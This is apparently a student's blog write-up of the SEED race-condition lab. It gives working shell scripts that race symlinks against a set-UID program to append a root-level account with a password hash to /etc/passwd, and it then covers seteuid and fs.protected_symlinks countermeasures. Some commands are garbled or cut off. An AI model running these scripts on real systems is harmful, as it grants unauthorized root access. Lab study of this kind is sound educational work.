---
title: Race-Condition
date: 2020-01-25 00:09:51
tags: [Security]
categories: [Security]
toc: true
comments: true
---
<!-- more -->
![](images/Race-Condition/Platform-SEEDUbuntu16__04--32bit-green.svg)  ![](images/Race-Condition/SEED-SoftwareSecurityLab-brightgreen.svg)

> This is report of SEED Lab report.

Table of Contents
=================

* [Task 1: Choosing Our Target](#task-1-choosing-our-target)
* [Task 2: Launching the Race Condition Attack](#task-2-launching-the-race-condition-attack)
* [Task 3 Countermeasure: Applying the Principle of Least Privilege](#task-3-countermeasure-applying-the-principle-of-least-privilege)
* [Task 4: Countermeasure: Using Ubuntu’s Built-in Scheme](#task-4-countermeasure-using-ubuntus-built-in-scheme)
* [About fs.protected_symlinks](#about-fsprotected_symlinks)
* [Test with fs.protected_symlinks=1](#test-with-fsprotected_symlinks1)
    * [实验原理:](#实验原理)
* [Official reference](#official-reference)


## Task 1: Choosing Our Target

```SHELL
$ sudo sysctl -w fs.protected_symlinks=0
```

Get the `vulp.c`  and compile it.

```shell
Ta
$ sudo chmod 4755 vulp
```

Analyze the program. Since it is set-UID program, it’s eUID is 0. Then it can overwrite any file. When it wants to modify some file, the program will check whether it has the privilege to do so. Hence there is a short time slice between it accessing the privilege and write the file. If we change the target file it wants to write, then we can overwrite some important file.

Our target is to add a root user, `test`, into the `/etc/passwd`.

```shell
test:U6aMy0wojraho:0:0:test:/root:/bin/bash
```

After test, we can find that if we add content above to `/etc/passwd`, then we can login test as root user.

So our target is to create a symbol link to `/etc/passwd`.

## Task 2: Launching the Race Condition Attack

We need run two scripts parallel.

```shell
# attack.sh
#!/bin/bash
CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" == "$new" ]
do
ln -sf /home/seed/Documents/SoftwareSecurity/raceCondition/tmp /tmp/XYZ
ln -sf /etc/passwd /tmp/XYZ
new=$($CHECK_FILE)
done
echo "STOP... The passwd file has been changed"

```

Another script:

```shell
# check.sh
#!/bin/bash
CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" == "$new" ]
do
./vulp < passwd_input
new=$($CHECK_FILE)
done
echo "STOP... The passwd file has been changed"
```

Before attack, ensure that the `/tmp/XYZ` does not exist and the `password_input` has been created.

then run two scripts you can find it succeeded.

```shell
$ sudo bash attack.sh
$ sudo bash check.sh
```



## Task 3 Countermeasure: Applying the Principle of Least Privilege

The fundamental problem of the vulnerable program in this lab is the violation of the Principle of Least Privilege.  The programmer does understand that the user who runs the program might be too powerful, so he/she introduced `access()`to limit the user’s power. However, this is not the proper approach. A better approach is to apply the Principle of Least Privilege;  namely,  if users do not need certain privilege,  the privilege needs to be disabled. We can use set-euid system call to temporarily disable the root privilege, and later enable it if necessary. Please use this approach to fix the vulnerability in the program, and then repeat your attack. Will you be able to succeed? Please report your observations and provide explanation.

Change the program like below, then compile and attack using this program again. We can find it failed. That is because the `seteuid()` function introduced a code segment where `access()` and `open()` would share the same privilege, so the try would fail.

```c
/* vulp.c */
#include <stdio.h>
#include<unistd.h>
#include<sys/types.h>


int main()
{
	char * fn = "/tmp/XYZ";
	char buffer[60];
	FILE *fp;
	/* get user input */
	scanf("%50s", buffer );

	uid_t e_uid = geteuid(); //new add
	seteuid(getuid()); //new add

	if(!access(fn, W_OK)){ 
		fp = fopen(fn, "a+"); 
		fwrite("\n", sizeof(char), 1, fp);
		fwrite(buffer, sizeof(char), strlen(buffer), fp);
		fclose(fp);
	}
	else printf("No permission \n");
	seteuid(e_uid); //new add
}
```

## Task 4: Countermeasure: Using Ubuntu’s Built-in Scheme

Ubuntu 10.10 and later come with a built-in protection scheme against race condition attacks.  In this task,you need to turn the protection back on using the following commands:

```shell
$ sudo sysctl -w kernel.yama.protected_sticky_symlinks=1
$ sudo sysctl -w fs.protected_symlinks=1
```

Conduct your attack after the protection is turned on.  Please describe your observations.  Please also explain the followings:  

(1) How does this protection scheme work?  

(2) What are the limitations of this scheme?

It will failed, but the details why this scheme would work is still not clear enough.

## About `fs.protected_symlinks`

= 0 means no limitation about normal users creating soft links.

=1 means only when the UID of the target equals to the soft link or the

## Test with `fs.protected_symlinks=1`

### 实验原理:

>##### Official reference
>
>A long-standing class of security issues is the symlink-based time-of-check-time-of-use race, most commonly seen in world-writable directories like /tmp. The common method of exploitation of this flaw is to cross privilege boundaries when following a given symlink (i.e. a root process follows a symlink belonging to another user). For a likely incomplete list of hundreds of examples across the years, please see: http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=/tmp
>
>When set to “0”, symlink following behavior is unrestricted.
>
>When set to “1” symlinks are permitted to be followed **only when outside a sticky world-writable directory, or when the uid of the symlink and follower match, or when the directory owner matches the symlink’s owner.**
>
>This protection is based on the restrictions in Openwall and grsecurity.

重点:

When set to “1” symlinks are permitted to be followed **only when outside a sticky world-writable directory, or when the uid of the symlink and follower match, or when the directory owner matches the symlink’s owner.**



